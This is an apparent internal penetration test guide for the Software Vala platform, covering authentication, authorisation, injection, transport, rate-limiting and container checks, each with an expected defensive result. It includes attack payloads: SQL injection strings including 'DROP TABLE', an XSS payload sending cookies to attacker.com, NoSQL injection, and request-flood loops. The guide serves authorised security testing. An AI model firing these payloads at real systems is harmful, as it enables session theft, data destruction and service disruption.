# Software Vala – Penetration Test Guide

## Overview

This document outlines the penetration testing procedures for the Software Vala platform.
All tests must be conducted in a **dedicated test environment** – never against production.

---

## Scope

| In Scope | Out of Scope |
|---|---|
| Web application (frontend SPA) | Supabase infrastructure itself |
| Supabase Edge Functions | Third-party payment gateways |
| Authentication & 2FA flows | Physical security |
| API endpoints | Social engineering |
| RLS policy enforcement | |

---

## 1. Authentication & Session Tests

### 1.1 Credential Brute Force
- Tool: `hydra`, `medusa`, or the built-in `tests/security/security-tests.ts`
- Expected: Locked after **5 failed attempts** within 5 minutes (HTTP 429)
- Verify: Rate limit headers present (`X-RateLimit-Remaining`, `Retry-After`)

### 1.2 Password Enumeration
- Submit valid email + wrong password vs invalid email + any password
- Expected: **Identical error message** for both cases (no user enumeration)

### 1.3 OTP Bypass / Brute Force
- Attempt to submit more than 5 OTP codes within 5 minutes
- Expected: Account temporarily locked

### 1.4 TOTP Replay Attack
- Record a valid TOTP code and attempt to reuse it
- Expected: Rejected (server tracks used tokens per time window)

### 1.5 JWT Tampering
```
# 1. Intercept a valid JWT via browser dev tools
# 2. Modify the payload (e.g. change role to boss_owner)
# 3. Send modified token to a protected endpoint
# Expected: HTTP 401
```

### 1.6 Session Fixation
- Set a session cookie before authentication
- Expected: Session ID regenerated after login

---

## 2. Authorisation Tests

### 2.1 Horizontal Privilege Escalation (IDOR)
- Login as user A, then request user B's resources using user A's token
- Endpoints to test: `/api-wallet/user/:id`, `/api-leads/:id`, `/api-profile/:id`
- Expected: HTTP 403 / 404

### 2.2 Vertical Privilege Escalation (Cross-Role Access)
- Login as `developer` role
- Attempt to access `boss_owner` / `ceo` endpoints
- Expected: HTTP 403

### 2.3 RLS Policy Bypass
- Using Supabase REST API directly, attempt to read rows belonging to other users
- Expected: Empty result set (RLS enforcement, not 403)

---

## 3. Injection Tests

### 3.1 SQL Injection
```sql
-- Payloads to try in search / filter params:
' OR '1'='1
'; DROP TABLE users;--
1 UNION SELECT * FROM user_roles--
```
- Expected: Input sanitised / parameterised queries – no raw SQL errors

### 3.2 XSS (Reflected & Stored)
```html
<!-- Try in any user-input field: -->
<script>alert(document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">
```
- Expected: Content escaped; CSP blocks inline scripts

### 3.3 NoSQL / JSON Injection
```json
{"email": {"$gt": ""}, "password": {"$gt": ""}}
```
- Expected: Rejected at input validation layer

---

## 4. Transport Security

### 4.1 TLS Version
```bash
nmap --script ssl-enum-ciphers -p 443 <target>
# Expected: TLS 1.2+ only; no SSLv3/TLS 1.0/1.1
```

### 4.2 Security Headers
```bash
curl -I https://<target>
# Expected headers:
#   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
#   X-Frame-Options: DENY
#   X-Content-Type-Options: nosniff
#   Content-Security-Policy: <non-empty value>
#   Referrer-Policy: no-referrer
```

### 4.3 Certificate Validation
- Check cert expiry, chain completeness, and CAA records

---

## 5. Rate Limiting & DDoS

### 5.1 API Flood
```bash
# Send 200 concurrent requests to a protected endpoint
ab -n 200 -c 200 -H "Authorization: Bearer <token>" https://<target>/api-leads
# Expected: HTTP 429 after threshold is exceeded
```

### 5.2 Auth Flood
```bash
for i in {1..20}; do
  curl -X POST https://<target>/auth/v1/token?grant_type=password \
    -d '{"email":"test@example.com","password":"wrong"}' &
done
# Expected: HTTP 429 after 5 failed attempts
```

---

## 6. Sensitive Data Exposure

### 6.1 Error Message Leakage
- Trigger errors (bad input, server errors)
- Expected: Generic messages only, no stack traces in production

### 6.2 Audit Log Masking
- Check that audit log entries don't contain raw passwords, OTP codes, or card numbers
- Expected: `[REDACTED]` in `meta_json` for sensitive fields

### 6.3 Source Code Secrets
```bash
trufflehog filesystem . --only-verified
# Expected: No committed secrets
```

---

## 7. Docker / Container Security

```bash
# Scan image for CVEs
trivy image softwarevala/app:latest

# Check container runs as non-root
docker inspect sv_app | jq '.[0].Config.User'
# Expected: "nginx" or a numeric UID != 0

# Verify read-only filesystem
docker inspect sv_app | jq '.[0].HostConfig.ReadonlyRootfs'
# Expected: true
```

---

## Reporting

- Severity classification: CVSS v3.1
- Report template: `security/pentest-report-template.md`
- Disclosure timeline: 90 days for critical, 120 days for high

## Remediation SLA

| Severity | Fix SLA |
|---|---|
| Critical | 24 hours |
| High | 7 days |
| Medium | 30 days |
| Low | 90 days |
